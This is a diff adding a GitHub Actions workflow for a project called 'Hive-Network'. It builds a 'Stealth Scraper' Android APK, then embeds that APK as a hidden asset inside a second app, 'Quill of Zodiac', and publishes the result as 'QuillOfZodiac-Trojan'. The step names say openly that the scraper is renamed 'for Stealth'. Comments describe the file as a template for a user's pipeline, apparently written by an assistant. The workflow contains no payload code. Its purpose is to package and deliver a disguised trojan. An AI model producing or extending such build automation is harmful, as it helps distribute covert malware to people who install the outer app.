@@ -1,0 +1,71 @@
+name: Build Hive-Network APKs
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build-scraper:
+    name: Build Stealth Scraper (systeminternet)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+
+      - name: Set up Java
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Install Briefcase
+        run: |
+          pip install briefcase
+
+      - name: Build Scraper APK
+        run: |
+          cd mobile_app/system_internet
+          briefcase create android --no-input
+          briefcase build android --no-input
+        # Note: In a real environment, we'd need to handle Android SDK licenses
+        # This is a template for the user's GitHub Actions.
+
+      - name: Upload Scraper APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: trojanhorseofdestiny-apk
+          path: mobile_app/system_internet/build/trojanhorseofdestiny/android/gradle/app/build/outputs/apk/debug/*.apk
+
+  build-trojan:
+    name: Build Quill of Zodiac (Trojan Bundle)
+    needs: build-scraper
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Download Scraper APK
+        uses: actions/download-artifact@v4
+        with:
+          name: trojanhorseofdestiny-apk
+          path: mobile_app/quill_dashboard/assets
+
+      - name: Rename Scraper for Stealth
+        run: mv mobile_app/quill_dashboard/assets/*.apk mobile_app/quill_dashboard/assets/trojanhorseofdestiny.apk
+
+      - name: Build Quill of Zodiac APK
+        run: |
+          # Here we would use a standard Gradle build for the Java/Kotlin app
+          cd mobile_app/quill_dashboard
+          chmod +x gradlew
+          ./gradlew assembleDebug
+
+      - name: Upload Final Trojan APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: QuillOfZodiac-Trojan
+          path: mobile_app/quill_dashboard/app/build/outputs/apk/debug/*.apk
